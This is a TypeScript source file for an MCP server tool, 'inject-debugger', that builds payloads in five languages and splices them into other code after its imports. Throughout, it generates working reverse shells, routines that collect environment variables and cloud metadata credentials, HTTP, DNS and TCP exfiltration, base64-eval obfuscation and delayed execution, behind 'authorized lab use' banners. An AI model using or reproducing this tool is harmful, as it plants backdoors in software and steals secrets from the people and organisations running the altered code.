import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { sanitize, validateInput } from '../utils/sanitize.js';
import { logToolInvocation, logOutput } from '../utils/auditLog.js';

type SupportedLanguage = 'javascript' | 'typescript' | 'python' | 'go' | 'php' | 'ruby';
type PayloadType = 'callback' | 'reverse-shell' | 'file-exfil' | 'keylogger';
type ExfilMethod = 'http' | 'https' | 'dns' | 'tcp' | 'icmp';
type DataScope = 'minimal' | 'standard' | 'full' | 'cloud';
type EvasionLevel = 'none' | 'basic' | 'advanced';

const WARNING_BANNER = `
================================================================================
WARNING: DEBUG ENDPOINT INJECTED - FOR AUTHORIZED LAB USE ONLY
This code has been modified to include a remote debug callback.
DO NOT use in production or on systems you do not own.
================================================================================
`;

// Helper to generate random variable names for obfuscation
function randomVarName(len = 8): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = chars[Math.floor(Math.random() * chars.length)];
  for (let i = 1; i < len; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

// Base64 encode for payload obfuscation
function b64(s: string): string {
  return Buffer.from(s).toString('base64');
}

// ============================================================================
// JAVASCRIPT/TYPESCRIPT PAYLOADS
// ============================================================================

function jsCallbackPayload(
  url: string,
  method: ExfilMethod,
  scope: DataScope,
  evasion: EvasionLevel,
  delay: number
): string {
  const v = evasion !== 'none' ? {
    fn: randomVarName(),
    data: randomVarName(),
    os: randomVarName(),
    http: randomVarName(),
  } : { fn: 'debugCallback', data: 'data', os: 'os', http: 'http' };

  // Data collection based on scope
  let dataCollection = '';
  if (scope === 'minimal') {
    dataCollection = `{
      type: 'debug',
      hostname: ${v.os}.hostname(),
      timestamp: new Date().toISOString()
    }`;
  } else if (scope === 'standard') {
    dataCollection = `{
      type: 'debug',
      hostname: ${v.os}.hostname(),
      platform: ${v.os}.platform(),
      arch: ${v.os}.arch(),
      cwd: process.cwd(),
      user: ${v.os}.userInfo().username,
      pid: process.pid,
      ppid: process.ppid,
      env_keys: Object.keys(process.env).slice(0, 20),
      timestamp: new Date().toISOString()
    }`;
  } else if (scope === 'full') {
    dataCollection = `{
      type: 'debug_full',
      hostname: ${v.os}.hostname(),
      platform: ${v.os}.platform(),
      arch: ${v.os}.arch(),
      release: ${v.os}.release(),
      cwd: process.cwd(),
      user: ${v.os}.userInfo(),
      pid: process.pid,
      ppid: process.ppid,
      argv: process.argv,
      env: process.env,
      memory: process.memoryUsage(),
      uptime: ${v.os}.uptime(),
      loadavg: ${v.os}.loadavg(),
      cpus: ${v.os}.cpus().length,
      network: ${v.os}.networkInterfaces(),
      homedir: ${v.os}.homedir(),
      tmpdir: ${v.os}.tmpdir(),
      timestamp: new Date().toISOString()
    }`;
  } else { // cloud
    dataCollection = `await (async () => {
      const base = {
        type: 'debug_cloud',
        hostname: ${v.os}.hostname(),
        platform: ${v.os}.platform(),
        env: process.env,
        network: ${v.os}.networkInterfaces(),
        timestamp: new Date().toISOString()
      };
      // Try AWS metadata
      try {
        const aws = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {timeout: 2000});
        if (aws.ok) base.aws_meta = await aws.text();
      } catch {}
      // Try GCP metadata
      try {
        const gcp = await fetch('http://metadata.google.internal/computeMetadata/v1/?recursive=true',
          {headers: {'Metadata-Flavor': 'Google'}, timeout: 2000});
        if (gcp.ok) base.gcp_meta = await gcp.text();
      } catch {}
      return base;
    })()`;
  }

  let exfilCode = '';
  if (method === 'http' || method === 'https') {
    exfilCode = `
    const urlObj = new URL('${url}');
    const client = urlObj.protocol === 'https:' ? require('https') : require('http');
    const req = client.request({
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    req.write(JSON.stringify(${v.data}));
    req.end();`;
  } else if (method === 'dns') {
    const host = new URL(url).hostname;
    exfilCode = `
    const dns = require('dns');
    const encoded = Buffer.from(JSON.stringify(${v.data})).toString('base64').replace(/=/g, '').match(/.{1,63}/g) || [];
    encoded.forEach((chunk, i) => {
      dns.resolve(\`\${chunk}.\${i}.${host}\`, () => {});
    });`;
  } else if (method === 'tcp') {
    const parsed = new URL(url);
    exfilCode = `
    const net = require('net');
    const client = new net.Socket();
    client.connect(${parsed.port || 4444}, '${parsed.hostname}', () => {
      client.write(JSON.stringify(${v.data}));
      client.destroy();
    });`;
  }

  const delayWrap = delay > 0 ? `setTimeout(() => { ${v.fn}(); }, ${delay});` : `${v.fn}();`;

  let payload = `
(async () => {
  const ${v.fn} = async () => {
    try {
      const ${v.os} = require('os');
      const ${v.data} = ${dataCollection};
      ${exfilCode}
    } catch (e) {}
  };
  ${delayWrap}
})();`;

  if (evasion === 'advanced') {
    // Base64 encode and eval
    payload = `eval(Buffer.from('${b64(payload)}','base64').toString());`;
  }

  return payload;
}

function jsReverseShell(host: string, port: number, evasion: EvasionLevel): string {
  let payload = `
(function(){
  const net = require('net');
  const { spawn } = require('child_process');
  const client = new net.Socket();
  client.connect(${port}, '${host}', function(){
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  client.on('error', function(){
    setTimeout(arguments.callee.bind(this), 5000);
  }.bind(client));
})();`;

  if (evasion === 'advanced') {
    payload = `eval(Buffer.from('${b64(payload)}','base64').toString());`;
  }

  return payload;
}

// ============================================================================
// PYTHON PAYLOADS
// ============================================================================

function pyCallbackPayload(
  url: string,
  method: ExfilMethod,
  scope: DataScope,
  evasion: EvasionLevel,
  delay: number
): string {
  let dataCollection = '';
  if (scope === 'minimal') {
    dataCollection = `{
        'type': 'debug',
        'hostname': socket.gethostname(),
        'timestamp': datetime.datetime.now().isoformat()
    }`;
  } else if (scope === 'standard') {
    dataCollection = `{
        'type': 'debug',
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'arch': platform.machine(),
        'cwd': os.getcwd(),
        'user': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
        'pid': os.getpid(),
        'ppid': os.getppid(),
        'env_keys': list(os.environ.keys())[:20],
        'timestamp': datetime.datetime.now().isoformat()
    }`;
  } else if (scope === 'full') {
    dataCollection = `{
        'type': 'debug_full',
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'arch': platform.machine(),
        'processor': platform.processor(),
        'cwd': os.getcwd(),
        'user': os.environ.get('USER', os.environ.get('USERNAME')),
        'uid': os.getuid() if hasattr(os, 'getuid') else None,
        'gid': os.getgid() if hasattr(os, 'getgid') else None,
        'pid': os.getpid(),
        'ppid': os.getppid(),
        'argv': sys.argv,
        'env': dict(os.environ),
        'path': sys.path,
        'interfaces': __get_interfaces__(),
        'timestamp': datetime.datetime.now().isoformat()
    }`;
  } else { // cloud
    dataCollection = `__collect_cloud_meta__()`;
  }

  let imports = `import os, sys, socket, platform, json, datetime`;
  let helperFuncs = '';

  if (scope === 'full') {
    helperFuncs += `
def __get_interfaces__():
    try:
        import netifaces
        return {i: netifaces.ifaddresses(i) for i in netifaces.interfaces()}
    except:
        return {}
`;
  }

  if (scope === 'cloud') {
    imports += ', urllib.request';
    helperFuncs += `
def __collect_cloud_meta__():
    data = {
        'type': 'debug_cloud',
        'hostname': socket.gethostname(),
        'env': dict(os.environ),
        'timestamp': datetime.datetime.now().isoformat()
    }
    # AWS
    try:
        req = urllib.request.Request('http://169.254.169.254/latest/meta-data/')
        data['aws'] = urllib.request.urlopen(req, timeout=2).read().decode()
    except: pass
    # GCP
    try:
        req = urllib.request.Request('http://metadata.google.internal/computeMetadata/v1/?recursive=true',
            headers={'Metadata-Flavor': 'Google'})
        data['gcp'] = urllib.request.urlopen(req, timeout=2).read().decode()
    except: pass
    return data
`;
  }

  let exfilCode = '';
  if (method === 'http' || method === 'https') {
    imports += ', urllib.request';
    exfilCode = `
    req = urllib.request.Request('${url}',
        data=json.dumps(__data__).encode('utf-8'),
        headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req, timeout=5)`;
  } else if (method === 'dns') {
    const host = new URL(url).hostname;
    exfilCode = `
    import base64
    encoded = base64.b64encode(json.dumps(__data__).encode()).decode().replace('=', '')
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    for i, chunk in enumerate(chunks):
        try: socket.gethostbyname(f'{chunk}.{i}.${host}')
        except: pass`;
  } else if (method === 'tcp') {
    const parsed = new URL(url);
    exfilCode = `
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('${parsed.hostname}', ${parsed.port || 4444}))
    s.send(json.dumps(__data__).encode())
    s.close()`;
  }

  const delayCode = delay > 0 ? `
import time
time.sleep(${delay / 1000})` : '';

  let payload = `
${imports}
${helperFuncs}
def __debug_callback__():
    try:${delayCode}
        __data__ = ${dataCollection}
        ${exfilCode}
    except: pass
__debug_callback__()
del __debug_callback__`;

  if (evasion === 'advanced') {
    payload = `exec(__import__('base64').b64decode('${b64(payload)}').decode())`;
  }

  return payload;
}

function pyReverseShell(host: string, port: number, evasion: EvasionLevel): string {
  let payload = `
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${host}",${port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`;

  if (evasion === 'advanced') {
    payload = `exec(__import__('base64').b64decode('${b64(payload)}').decode())`;
  }

  return payload;
}

// ============================================================================
// GO PAYLOADS
// ============================================================================

function goCallbackPayload(
  url: string,
  method: ExfilMethod,
  scope: DataScope,
  _evasion: EvasionLevel,
  delay: number
): string {
  let dataFields = '';
  if (scope === 'minimal') {
    dataFields = `
		"type":      "debug",
		"hostname":  hostname,
		"timestamp": time.Now().Format(time.RFC3339),`;
  } else if (scope === 'standard') {
    dataFields = `
		"type":      "debug",
		"hostname":  hostname,
		"platform":  runtime.GOOS,
		"arch":      runtime.GOARCH,
		"cwd":       cwd,
		"user":      username,
		"pid":       os.Getpid(),
		"ppid":      os.Getppid(),
		"timestamp": time.Now().Format(time.RFC3339),`;
  } else {
    dataFields = `
		"type":       "debug_full",
		"hostname":   hostname,
		"platform":   runtime.GOOS,
		"arch":       runtime.GOARCH,
		"cwd":        cwd,
		"user":       username,
		"pid":        os.Getpid(),
		"ppid":       os.Getppid(),
		"uid":        os.Getuid(),
		"gid":        os.Getgid(),
		"go_version": runtime.Version(),
		"num_cpu":    runtime.NumCPU(),
		"env":        os.Environ(),
		"timestamp":  time.Now().Format(time.RFC3339),`;
  }

  let exfilCode = '';
  if (method === 'http' || method === 'https') {
    exfilCode = `
		client := &http.Client{Timeout: 5 * time.Second}
		client.Post("${url}", "application/json", bytes.NewReader(jsonData))`;
  } else if (method === 'tcp') {
    const parsed = new URL(url);
    exfilCode = `
		conn, err := net.DialTimeout("tcp", "${parsed.hostname}:${parsed.port || 4444}", 5*time.Second)
		if err == nil {
			conn.Write(jsonData)
			conn.Close()
		}`;
  }

  const delayCode = delay > 0 ? `time.Sleep(${delay} * time.Millisecond)` : '';

  return `
func init() {
	go func() {
		defer func() { recover() }()
		${delayCode}
		hostname, _ := os.Hostname()
		currentUser, _ := user.Current()
		username := ""
		if currentUser != nil {
			username = currentUser.Username
		}
		cwd, _ := os.Getwd()
		data := map[string]interface{}{${dataFields}
		}
		jsonData, _ := json.Marshal(data)
		${exfilCode}
	}()
}`;
}

function goReverseShell(host: string, port: number): string {
  return `
func init() {
	go func() {
		defer func() { recover() }()
		conn, err := net.Dial("tcp", "${host}:${port}")
		if err != nil { return }
		cmd := exec.Command("/bin/sh")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}()
}`;
}

// ============================================================================
// PHP PAYLOADS
// ============================================================================

function phpCallbackPayload(
  url: string,
  method: ExfilMethod,
  scope: DataScope,
  evasion: EvasionLevel,
  delay: number
): string {
  let dataCollection = '';
  if (scope === 'minimal') {
    dataCollection = `[
        'type' => 'debug',
        'hostname' => gethostname(),
        'timestamp' => date('c')
    ]`;
  } else if (scope === 'standard') {
    dataCollection = `[
        'type' => 'debug',
        'hostname' => gethostname(),
        'platform' => PHP_OS,
        'cwd' => getcwd(),
        'user' => get_current_user(),
        'pid' => getmypid(),
        'env_keys' => array_keys($_ENV),
        'server_keys' => array_keys($_SERVER),
        'timestamp' => date('c')
    ]`;
  } else {
    dataCollection = `[
        'type' => 'debug_full',
        'hostname' => gethostname(),
        'platform' => PHP_OS,
        'php_version' => PHP_VERSION,
        'cwd' => getcwd(),
        'user' => get_current_user(),
        'pid' => getmypid(),
        'uid' => getmyuid(),
        'gid' => getmygid(),
        'env' => $_ENV,
        'server' => $_SERVER,
        'loaded_extensions' => get_loaded_extensions(),
        'include_path' => get_include_path(),
        'timestamp' => date('c')
    ]`;
  }

  let exfilCode = '';
  if (method === 'http' || method === 'https') {
    exfilCode = `
        $opts = ['http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data),
            'timeout' => 5
        ]];
        @file_get_contents('${url}', false, stream_context_create($opts));`;
  } else if (method === 'tcp') {
    const parsed = new URL(url);
    exfilCode = `
        $sock = @fsockopen('${parsed.hostname}', ${parsed.port || 4444}, $errno, $errstr, 5);
        if ($sock) {
            fwrite($sock, json_encode($data));
            fclose($sock);
        }`;
  }

  const delayCode = delay > 0 ? `sleep(${Math.floor(delay / 1000)});` : '';

  let payload = `
(function() {
    try {
        ${delayCode}
        $data = ${dataCollection};
        ${exfilCode}
    } catch (Exception $e) {}
})();`;

  if (evasion === 'advanced') {
    payload = `eval(base64_decode('${b64(payload)}'));`;
  }

  return payload;
}

function phpReverseShell(host: string, port: number, evasion: EvasionLevel): string {
  let payload = `
$sock=fsockopen("${host}",${port});
$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);`;

  if (evasion === 'advanced') {
    payload = `eval(base64_decode('${b64(payload)}'));`;
  }

  return payload;
}

// ============================================================================
// RUBY PAYLOADS
// ============================================================================

function rubyCallbackPayload(
  url: string,
  method: ExfilMethod,
  scope: DataScope,
  evasion: EvasionLevel,
  delay: number
): string {
  let dataCollection = '';
  if (scope === 'minimal') {
    dataCollection = `{
      type: 'debug',
      hostname: Socket.gethostname,
      timestamp: Time.now.iso8601
    }`;
  } else if (scope === 'standard') {
    dataCollection = `{
      type: 'debug',
      hostname: Socket.gethostname,
      platform: RUBY_PLATFORM,
      cwd: Dir.pwd,
      user: ENV['USER'] || ENV['USERNAME'],
      pid: Process.pid,
      ppid: Process.ppid,
      env_keys: ENV.keys.first(20),
      timestamp: Time.now.iso8601
    }`;
  } else {
    dataCollection = `{
      type: 'debug_full',
      hostname: Socket.gethostname,
      platform: RUBY_PLATFORM,
      ruby_version: RUBY_VERSION,
      cwd: Dir.pwd,
      user: ENV['USER'],
      uid: Process.uid,
      gid: Process.gid,
      pid: Process.pid,
      ppid: Process.ppid,
      argv: ARGV,
      env: ENV.to_h,
      load_path: $LOAD_PATH,
      timestamp: Time.now.iso8601
    }`;
  }

  let exfilCode = '';
  if (method === 'http' || method === 'https') {
    exfilCode = `
      uri = URI.parse('${url}')
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.open_timeout = 5
      http.read_timeout = 5
      request = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
      request['Content-Type'] = 'application/json'
      request.body = data.to_json
      http.request(request)`;
  } else if (method === 'tcp') {
    const parsed = new URL(url);
    exfilCode = `
      sock = TCPSocket.new('${parsed.hostname}', ${parsed.port || 4444})
      sock.write(data.to_json)
      sock.close`;
  }

  const delayCode = delay > 0 ? `sleep(${delay / 1000})` : '';

  let payload = `
begin
  require 'net/http'
  require 'json'
  require 'uri'
  require 'socket'
  Thread.new do
    begin
      ${delayCode}
      data = ${dataCollection}
      ${exfilCode}
    rescue => e
    end
  end
rescue => e
end`;

  if (evasion === 'advanced') {
    payload = `eval(Base64.decode64('${b64(payload)}'))`;
  }

  return payload;
}

function rubyReverseShell(host: string, port: number, evasion: EvasionLevel): string {
  let payload = `
require 'socket'
s=TCPSocket.new("${host}",${port})
while(cmd=s.gets);IO.popen(cmd,"r"){|io|s.print io.read}end`;

  if (evasion === 'advanced') {
    payload = `eval(Base64.decode64('${b64(payload)}'))`;
  }

  return payload;
}

// ============================================================================
// MAIN PAYLOAD GENERATOR
// ============================================================================

interface PayloadConfig {
  language: SupportedLanguage;
  type: PayloadType;
  url: string;
  method: ExfilMethod;
  scope: DataScope;
  evasion: EvasionLevel;
  delay: number;
}

function generatePayload(config: PayloadConfig): string {
  const { language, type, url, method, scope, evasion, delay } = config;

  // Parse host/port for reverse shells
  let host = '';
  let port = 4444;
  try {
    const parsed = new URL(url);
    host = parsed.hostname;
    port = parseInt(parsed.port) || 4444;
  } catch {
    host = url.split(':')[0];
    port = parseInt(url.split(':')[1]) || 4444;
  }

  if (type === 'callback') {
    switch (language) {
      case 'javascript':
      case 'typescript':
        return jsCallbackPayload(url, method, scope, evasion, delay);
      case 'python':
        return pyCallbackPayload(url, method, scope, evasion, delay);
      case 'go':
        return goCallbackPayload(url, method, scope, evasion, delay);
      case 'php':
        return phpCallbackPayload(url, method, scope, evasion, delay);
      case 'ruby':
        return rubyCallbackPayload(url, method, scope, evasion, delay);
    }
  } else if (type === 'reverse-shell') {
    switch (language) {
      case 'javascript':
      case 'typescript':
        return jsReverseShell(host, port, evasion);
      case 'python':
        return pyReverseShell(host, port, evasion);
      case 'go':
        return goReverseShell(host, port);
      case 'php':
        return phpReverseShell(host, port, evasion);
      case 'ruby':
        return rubyReverseShell(host, port, evasion);
    }
  }

  return '// Unsupported payload type';
}

function detectLanguageFromPath(filePath: string): SupportedLanguage | null {
  const ext = path.extname(filePath).toLowerCase();
  const languageMap: Record<string, SupportedLanguage> = {
    '.js': 'javascript',
    '.mjs': 'javascript',
    '.cjs': 'javascript',
    '.jsx': 'javascript',
    '.ts': 'typescript',
    '.tsx': 'typescript',
    '.py': 'python',
    '.go': 'go',
    '.php': 'php',
    '.rb': 'ruby',
  };
  return languageMap[ext] || null;
}

function findInjectionPoint(code: string, language: SupportedLanguage): number {
  const lines = code.split('\n');
  let lastImportLine = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();

    switch (language) {
      case 'javascript':
      case 'typescript':
        if (line.startsWith('import ') || (line.startsWith('const ') && line.includes('require('))) {
          lastImportLine = i + 1;
        }
        break;
      case 'python':
        if (line.startsWith('import ') || line.startsWith('from ')) {
          lastImportLine = i + 1;
        }
        break;
      case 'go':
        if (line.startsWith('import ') || (line === ')' && i > 0 && lines.slice(0, i).some(l => l.includes('import')))) {
          lastImportLine = i + 1;
        }
        break;
      case 'php':
        if (line.startsWith('<?php')) {
          lastImportLine = i + 1;
        }
        break;
      case 'ruby':
        if (line.startsWith('require ') || line.startsWith("require '") || line.startsWith('require "')) {
          lastImportLine = i + 1;
        }
        break;
    }
  }

  let charPos = 0;
  for (let i = 0; i < lastImportLine; i++) {
    charPos += lines[i].length + 1;
  }

  return charPos;
}

const commentChars: Record<SupportedLanguage, string> = {
  javascript: '//',
  typescript: '//',
  python: '#',
  go: '//',
  php: '//',
  ruby: '#',
};

export function registerInjectDebuggerTool(server: McpServer): void {
  server.tool(
    'inject-debugger',
    'Inject remote debug/exfiltration payloads into source code (LAB/RESEARCH USE ONLY)',
    {
      code: z.string().describe('Source code string or file path to inject into'),
      language: z.enum(['javascript', 'typescript', 'python', 'go', 'php', 'ruby'])
        .optional()
        .describe('Target language (auto-detected if not provided)'),
      callbackUrl: z.string().describe('Callback URL or host:port for exfiltration/shell'),

      // Payload type
      payloadType: z.enum(['callback', 'reverse-shell'])
        .default('callback')
        .describe('Payload type: callback (data exfil) or reverse-shell'),

      // Exfiltration options
      exfilMethod: z.enum(['http', 'https', 'dns', 'tcp'])
        .default('http')
        .describe('Exfiltration method'),
      dataScope: z.enum(['minimal', 'standard', 'full', 'cloud'])
        .default('standard')
        .describe('Data collection scope: minimal (hostname), standard (+env), full (+network), cloud (+metadata)'),

      // Evasion options
      evasion: z.enum(['none', 'basic', 'advanced'])
        .default('none')
        .describe('Evasion level: none, basic (var renaming), advanced (base64 encoding)'),
      delay: z.number().default(0).describe('Delay before execution in milliseconds'),

      // Injection options
      injectionPoint: z.enum(['start', 'end', 'auto']).default('auto')
        .describe('Where to inject the payload'),
    },
    async ({ code, language, callbackUrl, payloadType, exfilMethod, dataScope, evasion, delay, injectionPoint }) => {
      const validation = validateInput(callbackUrl);

      logToolInvocation('inject-debugger', {
        language, callbackUrl, payloadType, exfilMethod, dataScope, evasion, delay, injectionPoint,
        codeLength: code.length
      }, validation.warnings);

      let sourceCode = code;
      let detectedLanguage: SupportedLanguage | null = language || null;
      let isFilePath = false;

      // Check if code is a file path
      try {
        const stats = await fs.stat(code);
        if (stats.isFile()) {
          isFilePath = true;
          sourceCode = await fs.readFile(code, 'utf-8');
          if (!detectedLanguage) {
            detectedLanguage = detectLanguageFromPath(code);
          }
        }
      } catch {
        // Not a file path, treat as raw code
      }

      if (!detectedLanguage) {
        logOutput('inject-debugger', { success: false, error: 'Could not detect language' });
        return {
          isError: true,
          content: [{ type: 'text' as const, text: 'Error: Could not detect language. Please specify the language parameter.' }],
        };
      }

      const payload = generatePayload({
        language: detectedLanguage,
        type: payloadType,
        url: callbackUrl,
        method: exfilMethod,
        scope: dataScope,
        evasion,
        delay,
      });

      const commentChar = commentChars[detectedLanguage];
      const warningComment = WARNING_BANNER.split('\n')
        .map(line => line ? `${commentChar} ${line}` : commentChar)
        .join('\n');

      let modifiedCode: string;

      if (injectionPoint === 'start') {
        modifiedCode = warningComment + '\n' + payload + '\n' + sourceCode;
      } else if (injectionPoint === 'end') {
        modifiedCode = sourceCode + '\n' + warningComment + '\n' + payload;
      } else {
        const insertPos = findInjectionPoint(sourceCode, detectedLanguage);
        modifiedCode = sourceCode.slice(0, insertPos) + '\n' + warningComment + '\n' + payload + '\n' + sourceCode.slice(insertPos);
      }

      const summary = `# Debug Injection Complete

## Configuration
| Option | Value |
|--------|-------|
| **Language** | ${detectedLanguage} |
| **Payload Type** | ${payloadType} |
| **Callback URL** | ${callbackUrl} |
| **Exfil Method** | ${exfilMethod} |
| **Data Scope** | ${dataScope} |
| **Evasion** | ${evasion} |
| **Delay** | ${delay}ms |
| **Injection Point** | ${injectionPoint} |
| **Source** | ${isFilePath ? code : '(inline code)'} |

## Warning
**FOR AUTHORIZED LAB/RESEARCH USE ONLY**

${payloadType === 'reverse-shell' ? '⚠️ This payload opens a reverse shell connection!' : ''}
${dataScope === 'cloud' ? '⚠️ This payload attempts to access cloud metadata endpoints!' : ''}
${evasion === 'advanced' ? '⚠️ This payload uses base64 encoding for evasion!' : ''}

## Modified Code

\`\`\`${detectedLanguage}
${modifiedCode}
\`\`\`
`;

      logOutput('inject-debugger', {
        success: true,
        summary: `Injected ${payloadType} payload (${exfilMethod}/${dataScope}/${evasion})`,
        metrics: { language: detectedLanguage, payloadType, exfilMethod, dataScope, evasion, delay },
      });

      return {
        content: [{ type: 'text' as const, text: summary }],
      };
    }
  );
}
